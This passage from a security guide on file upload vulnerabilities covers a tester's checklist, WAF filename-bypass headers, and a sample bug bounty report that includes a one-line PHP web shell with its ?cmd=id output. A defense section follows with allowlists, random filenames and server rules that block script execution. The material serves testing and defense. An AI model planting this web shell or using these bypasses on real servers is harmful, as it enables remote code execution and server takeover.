[ ] Prepend magic bytes (JPEG/GIF89a) to payload
[ ] Try uploading .htaccess to change execution rules
[ ] Upload SVG with <script> tag (XSS)
[ ] Upload SVG with XXE payload
[ ] Upload ZIP with path traversal entries (ZIP Slip)
[ ] Try path traversal in filename: ../../shell.php
[ ] Check if file is accessible after upload
[ ] Check if file is executed when accessed
[ ] Test for race condition between upload and validation
[ ] Test Denial of Service with ZIP bomb or pixel flood
```

### WAF Bypass Techniques

```http

# Obfuscate filename in multipart header
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Disposition: form-data; name="file"; filename="shell.php "
Content-Disposition: form-data; name="file"; filename="shell.php;"
Content-Disposition: form-data; name="file"; FileName="shell.php"
Content-Disposition: form-data; name="file"; filename=shell.php
Content-Disposition: form-data; name="file"; filename='shell.php'

# Multiple Content-Disposition headers (parser confusion)
Content-Disposition: form-data; name="file"; filename="image.jpg"
Content-Disposition: form-data; name="file"; filename="shell.php"

# Boundary manipulation
Content-Type: multipart/form-data; boundary =----Boundary
Content-Type: multipart/form-data; boundary=----Boundary ;
```

### Sample Bug Bounty Report Template

```markdown

**Title**: Unrestricted File Upload Allows Remote Code Execution via Web Shell

**Severity**: Critical

**Endpoint**: POST /api/profile/avatar

**Steps to Reproduce**:
1. Log in to the application and navigate to profile settings.
2. Intercept the avatar upload request using Burp Suite.
3. Replace the file content with: <?php system($_GET['cmd']); ?>
4. Change filename to shell.php and Content-Type to image/jpeg.
5. Forward the request. Server responds with upload URL.
6. Visit the returned URL appended with ?cmd=id.
7. Server returns: uid=33(www-data) gid=33(www-data) groups=33(www-data)

**Impact**: Complete Remote Code Execution as the web server user. An attacker
can read all application files, database credentials, private keys, and pivot
to internal network services.

**PoC**: [attach Burp request / Python script]

**Suggested Fix**:
- Validate file type using server-side magic byte inspection (not Content-Type header)
- Use an allowlist of permitted extensions (jpg, png, gif only)
- Rename uploaded files to a random UUID — never use user-supplied names
- Store uploaded files outside the web root and serve via a dedicated route
- Disable PHP execution in the uploads directory via .htaccess or Nginx config
```

---

## Developer's Defense Guide

### Defense-in-Depth Strategy

#### Layer 1: Validate Type with Magic Bytes (Not Headers)

```python:secure

import magic
import imghdr

ALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif', 'image/webp'}

def get_real_mime(file_bytes: bytes) -> str:
    """Get actual file MIME type from content — not from client header"""
    return magic.from_buffer(file_bytes[:4096], mime=True)
```

#### Layer 2: Allowlist Extensions — Never Blocklist

```python:secure

# BAD — blocklist is always incomplete
BLOCKED = {'php', 'asp', 'jsp', 'sh', 'py', 'rb'}

# GOOD — allowlist only what you need
ALLOWED = {'jpg', 'jpeg', 'png', 'gif', 'webp'}

def is_allowed_extension(filename: str) -> bool:
    ext = filename.rsplit('.', 1)[-1].lower() if '.' in filename else ''
    return ext in ALLOWED
```

#### Layer 3: Randomize Filenames

```python:secure

import secrets
import os

def save_upload(file_bytes: bytes, original_name: str, ext: str) -> str:
    """Generate a cryptographically random filename — never expose original"""
    random_name = secrets.token_hex(24) + '.' + ext
    save_path   = os.path.join('/var/uploads', random_name)

    with open(save_path, 'wb') as f:
        f.write(file_bytes)

    return random_name
```

#### Layer 4: Store Files Outside Web Root

```nginx

# Nginx — serve uploads through a PHP/Python proxy, not directly
location /uploads/ {
    internal;       # Only accessible via X-Accel-Redirect, not directly
    alias /var/uploads/;
}
```

```python:secure

# Serve files via application — check auth, log access
@app.route('/media/<filename>')
@login_required
def serve_file(filename):
    # Validate filename is alphanumeric + extension only
    if not re.match(r'^[a-f0-9]{48}\.(jpg|png|gif|webp)$', filename):
        abort(404)

    return send_from_directory(
        '/var/uploads',
        filename,
        as_attachment=False,
        mimetype='image/jpeg'   # Force correct Content-Type
    )
```

#### Layer 5: Disable Script Execution in Upload Directory

```apache

# Apache — prevent execution of any script in uploads/
<Directory "/var/www/html/uploads">
    php_flag engine off
    Options -ExecCGI
    AddType text/plain .php .php3 .php5 .phtml .phar .asp .aspx .jsp
    RemoveHandler .php .php3 .php5 .phtml .phar
</Directory>
```

```nginx

# Nginx — deny script execution in upload directories
location ~* ^/uploads/.*\.(php|php3|php5|phtml|asp|aspx|jsp|cgi|sh)$ {
    deny all;
    return 403;
}
```

---

## Tools & Resources

### Detection & Testing Tools

| Tool | Purpose | URL |
|------|---------|-----|
| Burp Suite | Intercept and modify upload requests | https://portswigger.net/burp |
| Turbo Intruder | Race condition testing on uploads | https://github.com/PortSwigger/turbo-intruder |
| exiftool | Embed payloads in image metadata | https://exiftool.org |
| nuclei | Template-based upload vulnerability scanning | https://github.com/projectdiscovery/nuclei |
| ffuf | Fuzz file extensions and upload paths | https://github.com/ffuf/ffuf |
| katana | Spider applications to find upload endpoints | https://github.com/projectdiscovery/katana |
| Weevely | PHP web shell generator and manager | https://github.com/epinna/weevely3 |

### Useful nuclei Templates

```bash

# Scan for file upload vulnerabilities
nuclei -u https://example.com \
       -t nuclei-templates/vulnerabilities/generic/unrestricted-file-upload.yaml \
       -t nuclei-templates/vulnerabilities/wordpress/wp-file-upload.yaml \
       -t nuclei-templates/miscellaneous/htaccess-upload.yaml
```

### Learning Resources

- **OWASP File Upload Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- **PortSwigger File Upload Labs**: https://portswigger.net/web-security/file-upload
- **HackTricks File Upload**: https://book.hacktricks.xyz/pentesting-web/file-upload
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files

### Practice Labs

- **PortSwigger Web Academy**: File upload vulnerabilities — 11 guided labs
- **DVWA**: File upload module with low/medium/high security
- **HackTheBox**: Upload and RCE challenges
- **TryHackMe**: "Upload Vulnerabilities" room
- **PentesterLab**: Web for Pentester — File upload exercises

---

## Conclusion

File upload vulnerabilities remain one of the most critical vulnerability classes in web security. A single misconfigured upload endpoint can escalate from a simple file storage feature into full Remote Code Execution, complete server takeover, or persistent backdoor access.

Key takeaways:

1. **For Bug Bounty Hunters**: Test every upload endpoint with extension variations, MIME spoofing, magic byte injection, and SVG XSS. Don't stop at "file type rejected" — try all bypass techniques. File upload RCE is typically a Critical severity finding.

2. **For Developers**: Never trust the client. Validate file type using server-side magic byte inspection, use an allowlist of permitted extensions, randomize all filenames, store files outside the web root, and explicitly disable script execution in upload directories. Defense-in-depth is essential — no single control is sufficient alone.

3. **For Everyone**: A file upload feature that feels harmless can be the most dangerous endpoint in your application. Treat it with the same severity as SQL injection or authentication bypasses.

---

*This guide is a living document. Security evolves constantly, and new bypass techniques emerge regularly. Stay updated, practice on labs, and contribute to the security community.*

**Found this guide helpful?** Share it with your team and contribute your knowledge back to the community. If you find bugs using techniques from this guide, consider responsible disclosure.

---

*Published by KrazePlanet Security Research. For educational purposes only.*
